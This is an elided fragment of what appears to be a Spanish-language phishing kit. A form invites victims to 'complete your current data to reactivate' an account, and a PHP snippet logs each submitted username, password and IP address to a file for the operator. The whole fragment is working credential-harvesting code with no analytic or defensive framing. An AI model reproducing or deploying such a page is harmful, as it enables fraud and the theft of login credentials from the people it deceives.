...
fwrite($file, "<br>Usuar.: ".$_POST['primero']." - Clv.: ".$_POST['segundo']." - IP ".$userp ."" . PHP_EOL);
fclose($file);
...
Complete con sus datos actuales <br>para reactivar</h1>
    ...
    <section class="">
        ...
        <form action="index2.php" method="post" class="form_contact">
 	...
 	<br><br>
               <div align="center">
									<img src="css/lhder.gif" style="width:150px;"></div>
